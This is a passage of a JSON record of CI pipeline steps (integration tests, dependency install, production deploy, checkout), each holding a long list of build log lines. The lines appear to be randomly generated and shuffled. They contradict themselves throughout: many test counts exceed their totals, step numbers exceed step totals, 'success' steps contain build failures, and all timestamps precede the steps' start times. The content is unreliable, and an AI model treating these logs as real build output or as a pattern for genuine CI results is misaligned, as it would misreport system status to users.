          "Platform: win32-x64",
          "Environment: test",
          "NODE_ENV=test",
          "Done.",
          "TLS handshake completed",
          "Step 3/23: Testing",
          "Cache miss for key-8181",
          "Uploading artifact 'dist' (36 files)",
          "NODE_ENV=test",
          "HEAD is now at 646edc8",
          "Done.",
          "[12:19:53] INFO: Connecting to database",
          "Done.",
          "\u2713 All checks passed",
          "Connection established",
          "Done.",
          "POST /data - 200 (222ms)",
          "  PASS: e2e/test_user_create.spec.js",
          "Test Suites: 36 passed, 8 total",
          "HEAD is now at c094f7c",
          "Connection established",
          "Image pulled successfully",
          "yarn add: Done in 24.80s",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-22T12:20:15.583753",
        "finished_at": "2025-11-22T12:20:27.985558",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Verifying...",
          "Ran 187 tests in 55s",
          "Time: 105.716s",
          "Finished.",
          "HEAD is now at 5ebf51b",
          "Pushing to registry...",
          "Pulling image: python:3.11",
          "Artifact downloaded: 1MB",
          "pip: Installing build dependencies...",
          "[12:19:53] INFO: Starting build process",
          "\u2717 build failed with exit code 54",
          "Compiling utils/index.js...",
          "Fetching submodules...",
          "WARNING: jest has known vulnerabilities",
          "pip install: Successfully installed react-3.1",
          "yarn add: Done in 27.28s",
          "pip: Collecting lodash",
          "Layer 9/12: RUN command",
          "[12:19:53] DEBUG: Memory usage: 1604MB",
          "Cache restored successfully (216MB)",
          "yarn add: Done in 5.21s",
          "\u2713 lint completed",
          "npm install: resolved 1479 packages",
          "HEAD is now at 7dcdbee",
          "Creating production build...",
          "Step 11/19: Running migrations",
          "Ran 47 tests in 58s",
          "Environment: test",
          "Uploading artifact 'coverage' (37 files)",
          "OK",
          "[12:19:53] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (43MB)",
          "Finished.",
          "[12:19:53] DEBUG: Initializing service",
          "Transforming 889 files...",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm install: added 407 packages",
          "npm install: added 176 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache invalidated: build",
          "Success!",
          "Cache saved successfully",
          "Finished.",
          "npm install: resolved 756 packages",
          "npm install: resolved 1696 packages",
          "Minifying app.js",
          "Step 10/25: Deploying",
          "npm install: added 138 packages",
          "Compiling components/service.java...",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Generating source maps...",
          "Completed.",
          "FAILED: test_api_health",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Uploading artifact 'build' (28 files)",
          "Ready.",
          "Already up to date.",
          "Image pulled successfully",
          "  PASS: e2e/test_db_connect.spec.js",
          "Test Suites: 28 passed, 20 total",
          "WARNING: webpack has known vulnerabilities",
          "Building Docker image...",
          "POST /api - 201 (74ms)",
          "Optimizing 88 modules...",
          "[12:19:53] WARN: Deprecated API usage",
          "pip install: Successfully installed prettier-2.7",
          "Step 1/25: Installing dependencies",
          "Done.",
          "Creating production build...",
          "Test Suites: 16 passed, 7 total",
          "[12:19:53] WARN: Deprecated API usage",
          "Exception: TypeError",
          "Loading...",
          "Step 12/16: Linting",
          "Pushing to registry...",
          "Building Docker image...",
          "Generating source maps...",
          "Cache restored successfully (78MB)",
          "[12:19:53] DEBUG: Connection pool: 12 active",
          "FAILED: test_api_health",
          "Uploading artifact 'coverage' (7 files)",
          "GET /health - 204 (53ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Coverage: 83% statements, 69% branches",
          "HEAD is now at 4a70be6",
          "Platform: darwin-arm64",
          "Time: 23.315s",
          "Uploading artifact 'build' (12 files)",
          "Pulling image: node:latest",
          "HEAD is now at aa7f5fd",
          "\u2713 Step 'setup' succeeded",
          "WARNING: lodash has known vulnerabilities",
          "Using Node.js 17.15.8",
          "[12:19:53] INFO: Connecting to database",
          "[12:19:53] DEBUG: Loading configuration",
          "Using Python 3.12",
          "[12:19:53] DEBUG: Loading configuration",
          "Switched to branch 'feature/task-313'",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Transforming 696 files...",
          "Snapshots: 32 passed, 42 total",
          "Success!",
          "Using Node.js 16.14.8",
          "GET /health - 201 (15ms)",
          "Ready.",
          "Image pulled successfully",
          "Exception: RuntimeError",
          "Cache miss for key-4755",
          "\u2713 Task completed in 2573ms",
          "Compiling lib/utils.go...",
          "pip: Installing build dependencies...",
          "Using Node.js 20.12.10",
          "\u2713 All checks passed",
          "Switched to branch 'bugfix/task-769'",
          "OK",
          "Step 11/16: Testing",
          "Connection established",
          "pip install: Successfully installed eslint-5.11",
          "Pushing to registry...",
          "Verifying...",
          "Fetching submodules...",
          "Test Suites: 9 passed, 8 total",
          "[12:19:53] ERROR: Connection failed",
          "Artifact downloaded: 43MB",
          "WARNING: eslint has known vulnerabilities",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "Success!",
          "Done.",
          "Pushing to registry...",
          "Step 1/15: Deploying",
          "\u2713 deploy completed",
          "pip: Downloading lodash-4.6.tar.gz",
          "Compiling lib/index.js...",
          "Pushing to registry...",
          "yarn add: Done in 26.3s",
          "Step 15/18: Installing dependencies",
          "OK",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "OK",
          "Step 4/22: Linting",
          "Fetching submodules...",
          "Using Python 3.10",
          "npm notice: created a lockfile",
          "[12:19:53] WARN: Deprecated API usage",
          "POST /upload - 202 (449ms)",
          "pip install: Successfully installed lodash-1.8",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Finished.",
          "[12:19:53] DEBUG: Loading configuration",
          "[12:19:53] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: created a lockfile",
          "GET /health - 201 (87ms)",
          "Verifying...",
          "Environment: test",
          "Connecting to cloud.services:443...",
          "Minifying app.js",
          "Installing react@4.15.1",
          "Time: 119.890s",
          "pip: Downloading prettier-1.18.tar.gz",
          "NODE_ENV=test",
          "Cache miss for key-4567",
          "[12:19:53] INFO: Starting build process",
          "[12:19:53] DEBUG: Query executed in 85ms",
          "Test Suites: 45 passed, 25 total",
          "WARNING: jest has known vulnerabilities",
          "TLS handshake completed",
          "WARNING: lodash has known vulnerabilities",
          "Minifying main.js",
          "Done.",
          "Artifact uploaded: dist.zip (51MB)",
          "[12:19:53] INFO: Connecting to database",
          "NODE_ENV=development",
          "\u2713 All checks passed",
          "npm install: resolved 1206 packages",
          "HEAD is now at 5af2df0",
          "\u2713 Task completed in 2387ms",
          "Platform: linux-x64",
          "\u2713 lint completed",
          "GET /api - 204 (59ms)",
          "Step 6/21: Deploying",
          "pip: Downloading express-5.10.tar.gz",
          "Completed.",
          "Compiling lib/service.java...",
          "Cache restored successfully (193MB)",
          "npm install: resolved 108 packages",
          "Connection established",
          "Connecting to cloud.services:443...",
          "Ran 162 tests in 46s",
          "[12:19:53] INFO: Request completed",
          "\u2713 build completed",
          "Already up to date.",
          "[12:19:53] DEBUG: Memory usage: 1616MB",
          "Artifact downloaded: 18MB",
          "Bundling styles.js",
          "Step 1/16: Testing",
          "Artifact uploaded: dist.zip (53MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:53] INFO: Connecting to database",
          "Done.",
          "Step 2/18: Testing",
          "[12:19:53] ERROR: Connection failed",
          "Waiting...",
          "Optimizing 47 modules...",
          "\u2717 build failed with exit code 115",
          "Processing...",
          "Using Node.js 17.11.4",
          "Generating source maps...",
          "Generating source maps...",
          "npm notice: package.json updated",
          "Step 18/16: Building",
          "[12:19:53] INFO: Cache refreshed",
          "Step 7/25: Building",
          "Connecting to acme.corp:443...",
          "Step 5/17: Building",
          "Environment: production",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "yarn add: Done in 6.65s",
          "\u2713 Step 'setup' succeeded",
          "npm install: resolved 1413 packages",
          "[12:19:53] DEBUG: Loading configuration",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm install: added 89 packages",
          "npm install: resolved 620 packages",
          "Compiling utils/app.ts...",
          "Tests: 75 passed, 265 total",
          "WARNING: lodash has known vulnerabilities",
          "npm notice: package.json updated",
          "Checking out main branch",
          "Image pulled successfully",
          "GET /status - 200 (78ms)",
          "Exception: RuntimeError",
          "Compiling lib/utils.go...",
          "Step 1/21: Running migrations",
          "WARNING: prettier has known vulnerabilities",
          "Optimizing 24 modules...",
          "Platform: win32-x64",
          "NODE_ENV=test",
          "Step 5/20: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache invalidated: node_modules",
          "  PASS: test_auth_login (31ms)",
          "\u2713 All checks passed",
          "Uploading artifact 'coverage' (8 files)",
          "[12:19:53] ERROR: Connection failed",
          "Exception: ValueError",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Uploading artifact 'dist' (12 files)",
          "Pushing to registry...",
          "Compiling src/service.java...",
          "Uploading artifact 'build' (42 files)",
          "npm install: resolved 459 packages",
          "NODE_ENV=test",
          "[12:19:53] DEBUG: Memory usage: 1011MB",
          "\u2713 deploy completed",
          "Test Suites: 22 passed, 47 total",
          "Test Suites: 26 passed, 31 total",
          "Pulling image: alpine:latest",
          "Step 18/20: Deploying",
          "npm install: resolved 961 packages",
          "Cache miss for key-3190",
          "\u2713 Step 'setup' succeeded",
          "Pulling image: alpine:3.11",
          "yarn add: Done in 27.90s",
          "Bundling main.js",
          "Checking out main branch",
          "Coverage: 77% statements, 90% branches",
          "pip: Downloading eslint-3.1.tar.gz",
          "Checking out main branch",
          "Cache saved successfully",
          "[12:19:53] INFO: Starting build process",
          "[12:19:53] WARN: Deprecated API usage",
          "GET /health - 204 (21ms)",
          "Uploading artifact 'coverage' (12 files)",
          "yarn add: Done in 16.25s",
          "Test Suites: 40 passed, 10 total",
          "Step 3/25: Deploying",
          "Time: 39.924s",
          "yarn add: Done in 3.4s",
          "WARNING: prettier has known vulnerabilities",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-22T12:20:27.985558",
        "finished_at": "2025-11-22T12:20:46.588265",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Environment: production",
          "Step 9/23: Building",
          "Step 14/16: Testing",
          "Test Suites: 8 passed, 49 total",
          "Tests: 359 passed, 431 total",
          "Compiling src/index.js...",
          "Generating source maps...",
          "NODE_ENV=test",
          "npm install: resolved 716 packages",
          "Fetching submodules...",
          "Compiling src/main.py...",
          "Step 13/15: Deploying",
          "Generating source maps...",
          "[12:19:53] DEBUG: Memory usage: 136MB",
          "Connection established",
          "Done.",
          "Cache miss for key-6966",
          "[12:19:53] DEBUG: Query executed in 66ms",
          "NODE_ENV=development",
          "Layer 7/15: RUN command",
          "Transforming 504 files...",
          "Layer 4/14: RUN command",
          "HEAD is now at 3eca96f",
          "Compiling src/index.js...",
          "Fetching submodules...",
          "[12:19:53] INFO: Request completed",
          "OK",
          "npm notice: created a lockfile",
          "Step 20/15: Running migrations",
          "[12:19:53] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling components/handler.rs...",
          "[12:19:53] INFO: Cache refreshed",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Waiting...",
          "Layer 4/12: RUN command",
          "Snapshots: 13 passed, 31 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Node.js 16.13.6",
          "npm notice: package.json updated",
          "  PASS: test_db_connect (15ms)",
          "Already up to date.",
          "Image pulled successfully",
          "Installing prettier@4.19.4",
          "Platform: win32-x64",
          "HEAD is now at b391194",
          "\u2713 Step 'install' succeeded",
          "Step 9/23: Installing dependencies",
          "Loading...",
          "Snapshots: 20 passed, 34 total",
          "Cache hit for key-3775",
          "[12:19:53] INFO: Starting build process",
          "Compiling lib/service.java...",
          "Environment: test",
          "HEAD is now at e565404",
          "Exception: NullPointerException",
          "Installing eslint@3.9.4",
          "Uploading artifact 'build' (41 files)",
          "Step 14/22: Building",
          "Cache saved successfully",
          "Test Suites: 47 passed, 13 total",
          "yarn add: Done in 9.55s",
          "Compiling src/index.js...",
          "Uploading artifact 'build' (4 files)",
          "pip: Downloading axios-4.16.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:53] DEBUG: Loading configuration",
          "OK",
          "Test Suites: 21 passed, 20 total",
          "Time: 38.602s",
          "Compiling components/handler.rs...",
          "Ready.",
          "Switched to branch 'hotfix/task-807'",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Test Suites: 10 passed, 5 total",
          "Platform: darwin-arm64",
          "[12:19:53] DEBUG: Connection pool: 9 active",
          "yarn add: Done in 24.29s",
          "OK",
          "Step 18/19: Building",
          "FAILED: test_user_create",
          "Step 4/15: Testing",
          "WARNING: react has known vulnerabilities",
          "[12:19:53] ERROR: Connection failed",
          "Platform: darwin-arm64",
          "Environment: staging",
          "[12:19:53] DEBUG: Query executed in 1ms",
          "Compiling src/utils.go...",
          "Loading...",
          "Verifying...",
          "  PASS: unit/test_user_create.spec.js",
          "Transforming 573 files...",
          "[12:19:53] INFO: Request completed",
          "Compiling src/app.ts...",
          "\u2713 validate completed",
          "Ran 112 tests in 45s",
          "Transforming 306 files...",
          "GET /api - 204 (42ms)",
          "npm notice: created a lockfile",
          "Bundling runtime.js",
          "Minifying main.js",
          "npm notice: created a lockfile",
          "Connecting to example.com:443...",
          "WARNING: lodash has known vulnerabilities",
          "TLS handshake completed",
          "Cache restored successfully (462MB)",
          "pip install: Successfully installed eslint-3.13",
          "NODE_ENV=production",
          "FAILED: test_cache_hit",
          "pip: Collecting jest",
          "pip: Collecting prettier",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:19:53] DEBUG: Loading configuration",
          "Cache saved successfully",
          "Pulling image: node:3.11",
          "Environment: development",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 All checks passed",
          "[12:19:53] INFO: Request completed",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 8/24: Installing dependencies",
          "Step 16/15: Installing dependencies",
          "Connecting to cloud.services:443...",
          "[12:19:53] INFO: Cache refreshed",
          "Completed.",
          "Verifying...",
          "Minifying app.js",
          "Switched to branch 'bugfix/task-950'",
          "Uploading artifact 'coverage' (26 files)",
          "pip: Installing build dependencies...",
          "WARNING: eslint has known vulnerabilities",
          "Ready.",
          "Generating source maps...",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: created a lockfile",
          "[12:19:53] DEBUG: Query executed in 35ms",
          "Processing...",
          "GET /health - 201 (91ms)",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Completed.",
          "[12:19:53] ERROR: Connection failed",
          "npm notice: package.json updated",
          "Step 3/21: Testing",
          "[12:19:53] DEBUG: Query executed in 35ms",
          "\u2713 Step 'checkout' succeeded",
          "\u2713 All checks passed",
          "Uploading artifact 'coverage' (24 files)",
          "pip: Installing build dependencies...",
          "Transforming 511 files...",
          "[12:19:53] ERROR: Connection failed",
          "npm install: resolved 757 packages",
          "Processing...",
          "Exception: NullPointerException",
          "Building Docker image...",
          "Installing axios@2.6.10",
          "[12:19:53] DEBUG: Loading configuration",
          "Completed.",
          "[12:19:53] INFO: Starting build process",
          "[12:19:53] DEBUG: Initializing service",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (78MB)",
          "Ran 97 tests in 7s",
          "\u2713 Step 'checkout' succeeded",
          "Step 5/23: Installing dependencies",
          "Platform: darwin-arm64",
          "Using Python 3.10",
          "Done.",
          "[12:19:53] DEBUG: Memory usage: 1009MB",
          "Generating source maps...",
          "Step 2/15: Deploying",
          "HEAD is now at 435117a",
          "Image pulled successfully",
          "Done.",
          "Ready.",
          "pip install: Successfully installed jest-3.15",
          "[12:19:53] INFO: Processing request",
          "FAILED: test_cache_hit",
          "Using Node.js 16.10.7",
          "Transforming 323 files...",
          "[12:19:53] DEBUG: Connection pool: 10 active",
          "Tests: 54 passed, 146 total",
          "[12:19:53] WARN: Deprecated API usage",
          "[12:19:53] WARN: Deprecated API usage",
          "WARNING: jest has known vulnerabilities",
          "Fetching submodules...",
          "NODE_ENV=development",
          "\u2717 build failed with exit code 79",
          "Ready.",
          "npm notice: package.json updated",
          "\u2713 build completed",
          "\u2713 build completed",
          "Verifying...",
          "pip install: Successfully installed webpack-1.4",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Completed.",
          "FAILED: test_cache_hit",
          "Tests: 452 passed, 259 total",
          "Ran 193 tests in 16s",
          "\u2713 Task completed in 2670ms",
          "Optimizing 48 modules...",
          "npm notice: package.json updated",
          "Cache invalidated: node_modules",
          "Step 16/17: Testing",
          "Artifact downloaded: 43MB",
          "Ready.",
          "Compiling lib/main.py...",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "Cache invalidated: dependencies",
          "[12:19:53] DEBUG: Memory usage: 1791MB",
          "[12:19:53] DEBUG: Memory usage: 2000MB",
          "WARNING: express has known vulnerabilities",
          "Creating production build...",
          "WARNING: jest has known vulnerabilities",
          "Step 18/24: Linting",
          "Ran 52 tests in 6s",
          "FAILED: test_db_connect",
          "NODE_ENV=test",
          "Optimizing 48 modules...",
          "Time: 51.158s",
          "Pushing to registry...",
          "[12:19:53] DEBUG: Query executed in 96ms",
          "Cache miss for key-8524",
          "[12:19:53] DEBUG: Initializing service",
          "Optimizing 56 modules...",
          "Transforming 164 files...",
          "Cache hit for key-8395",
          "FAILED: test_user_create",
          "pip: Downloading eslint-5.18.tar.gz",
          "GET /api - 204 (85ms)",
          "\u2713 Step 'checkout' succeeded",
          "Compiling components/service.java...",
          "Step 5/24: Running migrations",
          "[12:19:53] DEBUG: Initializing service",
          "Uploading artifact 'coverage' (50 files)",
          "Environment: test",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 3/15: Deploying",
          "[12:19:53] INFO: Starting build process",
          "pip install: Successfully installed express-2.20",
          "Bundling runtime.js",
          "yarn add: Done in 13.28s",
          "[12:19:53] INFO: Request completed",
          "Artifact downloaded: 47MB",
          "Installing eslint@3.14.6",
          "Cache saved successfully",
          "HEAD is now at 4c90892",
          "Snapshots: 28 passed, 26 total",
          "Creating production build...",
          "npm install: added 374 packages",
          "Cache miss for key-8839",
          "Platform: win32-x64",
          "Using Node.js 17.13.8",
          "Pushing to registry...",
          "[12:19:53] INFO: Cache refreshed",
          "pip: Collecting express",
          "POST /data - 202 (326ms)",
          "Step 18/25: Linting",
          "Compiling src/handler.rs...",
          "Checking out master branch",
          "TLS handshake completed",
          "Artifact uploaded: dist.zip (84MB)",
          "[12:19:53] WARN: Deprecated API usage",
          "WARNING: axios has known vulnerabilities",
          "Fetching submodules...",
          "GET /health - 204 (25ms)",
          "Transforming 484 files...",
          "Step 1/15: Installing dependencies",
          "Using Python 3.10",
          "\u2713 All checks passed",
          "Switched to branch 'bugfix/task-178'",
          "Test Suites: 15 passed, 30 total",
          "Ready.",
          "Processing...",
          "Building Docker image...",
          "Cache miss for key-1651",
          "npm install: resolved 1770 packages",
          "Step 5/23: Building",
          "npm install: resolved 874 packages",
          "Step 2/18: Deploying",
          "Loading...",
          "\u2713 deploy completed",
          "Verifying...",
          "Coverage: 71% statements, 74% branches",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-22T12:20:46.588265",
        "finished_at": "2025-11-22T12:20:49.068626",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Optimizing 86 modules...",
          "Uploading artifact 'build' (37 files)",
          "\u2713 All checks passed",
          "OK",
          "\u2717 build failed with exit code 32",
          "Exception: RuntimeError",
          "Platform: win32-x64",
          "Cache hit for key-8476",
          "[12:19:53] DEBUG: Memory usage: 1266MB",
          "Step 10/23: Running migrations",
          "npm install: added 352 packages",
          "Test Suites: 16 passed, 34 total",
          "Connecting to test.io:443...",
          "pip: Collecting prettier",
          "Environment: test",
          "Time: 87.259s",
          "[12:19:53] INFO: Request completed",
          "Ran 24 tests in 34s",
          "[12:19:53] INFO: Request completed",
          "Cache invalidated: node_modules",
          "Switched to branch 'bugfix/task-883'",
          "npm install: resolved 320 packages",
          "[12:19:53] WARN: Deprecated API usage",
          "Step 13/18: Linting",
          "Snapshots: 20 passed, 1 total",
          "Connecting to test.io:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "GET /health - 200 (14ms)",
          "npm install: resolved 1264 packages",
          "Test Suites: 18 passed, 15 total",
          "Processing...",
          "[12:19:53] DEBUG: Memory usage: 1143MB",
          "Platform: win32-x64",
          "Coverage: 77% statements, 61% branches",
          "Compiling utils/app.ts...",
          "npm install: added 339 packages",
          "Already up to date.",
          "[12:19:53] INFO: Starting build process",
          "\u2713 All checks passed",
          "WARNING: webpack has known vulnerabilities",
          "Environment: development",
          "Image pulled successfully",
          "  PASS: test_user_create (252ms)",
          "Step 2/24: Installing dependencies",
          "pip: Installing build dependencies...",
          "pip: Downloading webpack-3.10.tar.gz",
          "POST /upload - 201 (164ms)",
          "\u2713 All checks passed",
          "Completed.",
          "Compiling utils/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2717 build failed with exit code 43",
          "Cache restored successfully (381MB)",
          "Using Python 3.10",
          "[12:19:53] DEBUG: Memory usage: 993MB",
          "\u2713 Step 'test' succeeded",
          "[12:19:53] WARN: Deprecated API usage",
          "FAILED: test_cache_hit",
          "Step 18/19: Testing",
          "[12:19:53] DEBUG: Memory usage: 775MB",
          "npm install: added 82 packages",
          "Platform: linux-x64",
          "[12:19:53] DEBUG: Initializing service",
          "WARNING: express has known vulnerabilities",
          "Layer 8/14: COPY command",
          "Step 9/17: Installing dependencies",
          "Finished.",
          "Platform: linux-x64",
          "Cache hit for key-1243",
          "Step 11/15: Deploying",
          "Tests: 139 passed, 402 total",
          "GET /api - 200 (46ms)",
          "Verifying...",
          "Step 10/22: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Exception: NullPointerException",
          "Platform: linux-x64",
          "[12:19:53] DEBUG: Loading configuration",
          "Tests: 294 passed, 335 total",
          "Building Docker image...",
          "Tests: 170 passed, 450 total",
          "Compiling src/service.java...",
          "\u2713 Task completed in 2901ms",
          "Generating source maps...",
          "Step 15/24: Linting",
          "[12:19:53] INFO: Cache refreshed",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache invalidated: dependencies",
          "Transforming 350 files...",
          "Pushing to registry...",
          "Artifact uploaded: dist.zip (84MB)",
          "Switched to branch 'hotfix/task-157'",
          "Loading...",
          "Generating source maps...",
          "[12:19:53] DEBUG: Connection pool: 9 active",
          "[12:19:53] DEBUG: Memory usage: 543MB",
          "OK",
          "\u2713 Task completed in 4036ms",
          "Cache restored successfully (282MB)",
          "Loading...",
          "OK",
          "  PASS: test_db_connect (147ms)",
          "Cache miss for key-8459",
          "\u2713 Task completed in 1871ms",
          "\u2713 Task completed in 421ms",
          "Processing...",
          "Cache miss for key-2145",
          "Step 14/18: Deploying",
          "Connection established",
          "npm install: added 228 packages",
          "Checking out develop branch",
          "Snapshots: 18 passed, 6 total",
          "Compiling utils/service.java...",
          "Time: 80.121s",
          "Compiling utils/main.py...",
          "Ready.",
          "Creating production build...",
          "OK",
          "pip: Collecting webpack",
          "POST /data - 200 (209ms)",
          "Building Docker image...",
          "Exception: NullPointerException",
          "[12:19:53] WARN: Deprecated API usage",
          "Coverage: 98% statements, 78% branches",
          "Already up to date.",
          "Cache restored successfully (290MB)",
          "Image pulled successfully",
          "Verifying...",
          "Ran 88 tests in 27s",
          "Compiling utils/app.ts...",
          "Switched to branch 'feature/task-480'",
          "Completed.",
          "[12:19:53] DEBUG: Loading configuration",
          "[12:19:53] INFO: Cache refreshed",
          "Coverage: 97% statements, 89% branches",
          "Step 5/23: Installing dependencies",
          "Bundling runtime.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Collecting axios",
          "Ready.",
          "Creating production build...",
          "HEAD is now at e037081",
          "[12:19:53] DEBUG: Loading configuration",
          "Creating production build...",
          "npm install: resolved 780 packages",
          "Image pulled successfully",
          "  PASS: test_cache_hit (83ms)",
          "[12:19:53] DEBUG: Initializing service",
          "[12:19:53] DEBUG: Query executed in 79ms",
          "NODE_ENV=development",
          "Finished.",
          "[12:19:53] DEBUG: Connection pool: 13 active",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Generating source maps...",
          "pip: Collecting webpack",
          "Loading...",
          "Step 3/21: Deploying",
          "[12:19:53] WARN: Deprecated API usage",
          "\u2713 Step 'checkout' succeeded",
          "[12:19:53] INFO: Connecting to database",
          "Step 4/18: Running migrations",
          "Switched to branch 'hotfix/task-481'",
          "Creating production build...",
          "Done.",
          "[12:19:53] DEBUG: Loading configuration",
          "NODE_ENV=test",
          "Uploading artifact 'build' (6 files)",
          "Pushing to registry...",
          "Compiling src/app.ts...",
          "WARNING: express has known vulnerabilities",
          "Cache invalidated: build",
          "Cache miss for key-7310",
          "Finished.",
          "  PASS: integration/test_db_connect.spec.js",
          "NODE_ENV=development",
          "Cache hit for key-8898",
          "Cache miss for key-9765",
          "Processing...",
          "NODE_ENV=development",
          "HEAD is now at b10cb58",
          "Building Docker image...",
          "WARNING: prettier has known vulnerabilities",
          "Compiling utils/app.ts...",
          "[12:19:53] DEBUG: Connection pool: 5 active",
          "Verifying...",
          "Switched to branch 'hotfix/task-569'",
          "Compiling utils/main.py...",
          "pip: Collecting express",
          "Test Suites: 49 passed, 39 total",
          "Connecting to test.io:443...",
          "Step 4/15: Deploying",
          "Test Suites: 8 passed, 32 total",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:19:53] DEBUG: Loading configuration",
          "Verifying...",
          "Done.",
          "Step 14/22: Installing dependencies",
          "Connecting to test.io:443...",
          "WARNING: webpack has known vulnerabilities",
          "TLS handshake completed",
          "Connection established",
          "[12:19:53] INFO: Starting build process",
          "Compiling utils/app.ts...",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "\u2713 Step 'install' succeeded",
          "pip: Collecting express",
          "[12:19:53] DEBUG: Initializing service",
          "POST /data - 201 (285ms)",
          "[12:19:53] DEBUG: Query executed in 38ms",
          "  PASS: test_auth_login (343ms)",
          "NODE_ENV=production",
          "Compiling components/service.java...",
          "Connection established",
          "NODE_ENV=test",
          "[12:19:53] WARN: Deprecated API usage",
          "\u2713 deploy completed",
          "Artifact uploaded: dist.zip (48MB)",
          "Finished.",
          "FAILED: test_api_health",
          "Cache restored successfully (456MB)",
          "  PASS: test_api_health (436ms)",
          "Using Node.js 17.13.2",
          "Using Python 3.11",
          "Ran 145 tests in 23s",
          "\u2713 Step 'build' succeeded",
          "Pushing to registry...",
          "[12:19:53] WARN: Deprecated API usage",
          "Connection established",
          "GET /health - 200 (68ms)",
          "Ready.",
          "Coverage: 91% statements, 99% branches",
          "[12:19:53] INFO: Connecting to database",
          "[12:19:53] INFO: Cache refreshed",
          "[12:19:53] INFO: Processing request",
          "[12:19:53] ERROR: Connection failed",
          "Tests: 477 passed, 293 total",
          "Done.",
          "Done.",
          "[12:19:53] INFO: Request completed",
          "Already up to date.",
          "Uploading artifact 'dist' (6 files)",
          "Compiling src/main.py...",
          "yarn add: Done in 18.89s",
          "pip: Downloading prettier-5.20.tar.gz",
          "npm notice: package.json updated",
          "[12:19:53] DEBUG: Query executed in 21ms",
          "Using Node.js 18.7.7",
          "Step 3/20: Building",
          "Loading...",
          "[12:19:53] DEBUG: Loading configuration",
          "Step 10/25: Testing",
          "Checking out main branch",
          "\u2713 Task completed in 4828ms",
          "Waiting...",
          "Environment: test",
          "Using Python 3.9",
          "\u2713 Task completed in 3659ms",
          "Compiling src/app.ts...",
          "npm notice: package.json updated",
          "[12:19:53] DEBUG: Memory usage: 1353MB",
          "Compiling src/main.py...",
          "npm install: added 198 packages",
          "\u2717 build failed with exit code 96",
          "[12:19:53] DEBUG: Query executed in 24ms",
          "Uploading artifact 'coverage' (10 files)",
          "Checking out develop branch",
          "Fetching submodules...",
          "Ran 171 tests in 8s",
          "Artifact uploaded: dist.zip (57MB)",
          "Optimizing 83 modules...",
          "Exception: RuntimeError",
          "[12:19:53] INFO: Processing request",
          "Pushing to registry...",
          "Image pulled successfully",
          "[12:19:53] WARN: Deprecated API usage",
          "  PASS: test_user_create (29ms)",
          "Waiting...",
          "Done.",
          "Cache restored successfully (58MB)",
          "  PASS: test_auth_login (66ms)",
          "Minifying app.js",
          "Installing jest@2.17.9",
          "[12:19:53] DEBUG: Memory usage: 774MB",
          "Verifying...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-22T12:20:49.068626",
        "finished_at": "2025-11-22T12:20:51.548987",
        "log_lines": [
          "=== Step: checkout ===",
          "Switched to branch 'hotfix/task-909'",
          "[12:19:53] INFO: Cache refreshed",
          "  PASS: integration/test_auth_login.spec.js",
          "[12:19:53] DEBUG: Query executed in 47ms",
          "[12:19:53] DEBUG: Initializing service",
          "Layer 1/10: ENV command",
          "Finished.",
          "pip: Downloading react-4.16.tar.gz",
          "Building Docker image...",
          "Processing...",
          "OK",
          "HEAD is now at f26e82d",
          "POST /api - 201 (200ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 All checks passed",
          "Loading...",
          "Success!",
